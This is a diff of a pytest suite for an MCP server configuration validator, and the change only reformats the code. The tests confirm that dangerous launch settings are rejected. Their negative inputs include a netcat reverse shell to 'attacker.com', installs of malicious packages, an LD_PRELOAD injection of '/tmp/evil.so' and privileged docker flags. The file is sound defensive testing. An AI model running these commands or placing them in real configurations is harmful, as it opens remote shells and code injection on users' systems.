@@ -38,9 +38,7 @@ class TestMCPCommandInjectionSecurity:
         assert config.command == "/usr/bin/node"
 
         # Windows-style path
-        config = MCPServerConfig(
-            command="C:\\Program Files\\nodejs\\node.exe", args=["server.js"]
-        )
+        config = MCPServerConfig(command="C:\\Program Files\\nodejs\\node.exe", args=["server.js"])
         assert config.command == "C:\\Program Files\\nodejs\\node.exe"
 
     def test_dangerous_command_rejected(self):
@@ -68,9 +66,7 @@ class TestMCPCommandInjectionSecurity:
         # These should all pass validation
         valid_configs = [
             MCPServerConfig(command="cmd", args=["/c", "uvx", "mcp-server"]),
-            MCPServerConfig(
-                command="sh", args=["-c", "npx @modelcontextprotocol/server"]
-            ),
+            MCPServerConfig(command="sh", args=["-c", "npx @modelcontextprotocol/server"]),
             MCPServerConfig(command="bash", args=["-c", "python -m mcp_server"]),
             MCPServerConfig(command="cmd", args=["/c", "node", "server.js"]),
         ]
@@ -129,9 +125,7 @@ class TestMCPCommandInjectionSecurity:
         assert config.command == "uvx mcp-server-fetch"
 
         # Other examples
-        config = MCPServerConfig(
-            command="npx @modelcontextprotocol/server-fetch", args=None
-        )
+        config = MCPServerConfig(command="npx @modelcontextprotocol/server-fetch", args=None)
         assert config.command == "npx @modelcontextprotocol/server-fetch"
 
         config = MCPServerConfig(command="python -m mcp_server", args=None)
@@ -201,17 +195,12 @@ class TestMCPCommandInjectionSecurity:
             MCPServerConfig(command="python3", args=["-c", "import os"])
 
         error_msg = str(exc_info.value).lower()
-        assert (
-            "only allowed with shell wrappers" in error_msg
-            or "not allowed" in error_msg
-        )
+        assert "only allowed with shell wrappers" in error_msg or "not allowed" in error_msg
 
     def test_python_pip_install_rejected(self):
         """Test that Python pip install is rejected."""
         with pytest.raises(ValidationError) as exc_info:
-            MCPServerConfig(
-                command="python3", args=["-m", "pip", "install", "malicious-pkg"]
-            )
+            MCPServerConfig(command="python3", args=["-m", "pip", "install", "malicious-pkg"])
 
         error_msg = str(exc_info.value)
         assert "not allowed" in error_msg.lower()
@@ -228,9 +217,7 @@ class TestMCPCommandInjectionSecurity:
     def test_pip_install_rejected(self):
         """Test that pip install is rejected."""
         with pytest.raises(ValidationError) as exc_info:
-            MCPServerConfig(
-                command="python3", args=["pip", "install", "malicious-package"]
-            )
+            MCPServerConfig(command="python3", args=["pip", "install", "malicious-package"])
 
         error_msg = str(exc_info.value)
         assert "not allowed" in error_msg.lower()
@@ -238,9 +225,7 @@ class TestMCPCommandInjectionSecurity:
     def test_npm_install_rejected(self):
         """Test that npm install is rejected."""
         with pytest.raises(ValidationError) as exc_info:
-            MCPServerConfig(
-                command="node", args=["npm", "install", "malicious-package"]
-            )
+            MCPServerConfig(command="node", args=["npm", "install", "malicious-package"])
 
         error_msg = str(exc_info.value)
         assert "not allowed" in error_msg.lower()
@@ -291,9 +276,7 @@ class TestMCPCommandInjectionSecurity:
     def test_poc_netcat_reverse_shell_rejected(self):
         """Test that netcat reverse shell is rejected."""
         with pytest.raises(ValidationError) as exc_info:
-            MCPServerConfig(
-                command="nc", args=["-e", "/bin/bash", "attacker.com", "4444"]
-            )
+            MCPServerConfig(command="nc", args=["-e", "/bin/bash", "attacker.com", "4444"])
 
         error_msg = str(exc_info.value)
         assert "not allowed" in error_msg.lower()
@@ -455,9 +438,7 @@ class TestMCPCommandInjectionSecurity:
     def test_ld_preload_env_rejected(self):
         """Test that LD_PRELOAD env var is rejected (arbitrary shared object injection)."""
         with pytest.raises(ValidationError) as exc_info:
-            MCPServerConfig(
-                command="node", args=["server.js"], env={"LD_PRELOAD": "/tmp/evil.so"}
-            )  # noqa: S108
+            MCPServerConfig(command="node", args=["server.js"], env={"LD_PRELOAD": "/tmp/evil.so"})
 
         error_msg = str(exc_info.value)
         assert "not allowed" in error_msg.lower()
@@ -637,9 +618,7 @@ class TestMCPCommandInjectionSecurity:
         """Test that env var blocklist is case-insensitive."""
         for variant in ["LD_PRELOAD", "ld_preload", "Ld_Preload", "LD_preload"]:
             with pytest.raises(ValidationError):
-                MCPServerConfig(
-                    command="node", args=["server.js"], env={variant: "/tmp/evil.so"}
-                )  # noqa: S108
+                MCPServerConfig(command="node", args=["server.js"], env={variant: "/tmp/evil.so"})
 
     def test_all_dangerous_env_vars_blocked(self):
         """Test that every entry in DANGEROUS_ENV_VARS is actually blocked."""
@@ -691,9 +670,7 @@ class TestMCPCommandInjectionSecurity:
     def test_docker_network_host_rejected(self):
         """Test that docker --network=host is rejected."""
         with pytest.raises(ValidationError) as exc_info:
-            MCPServerConfig(
-                command="docker", args=["run", "--network=host", "mcp-image"]
-            )
+            MCPServerConfig(command="docker", args=["run", "--network=host", "mcp-image"])
 
         error_msg = str(exc_info.value)
         assert "not allowed" in error_msg.lower()
@@ -709,9 +686,7 @@ class TestMCPCommandInjectionSecurity:
     def test_docker_cap_add_rejected(self):
         """Test that docker --cap-add is rejected."""
         with pytest.raises(ValidationError) as exc_info:
-            MCPServerConfig(
-                command="docker", args=["run", "--cap-add=SYS_ADMIN", "mcp-image"]
-            )
+            MCPServerConfig(command="docker", args=["run", "--cap-add=SYS_ADMIN", "mcp-image"])
 
         error_msg = str(exc_info.value)
         assert "not allowed" in error_msg.lower()
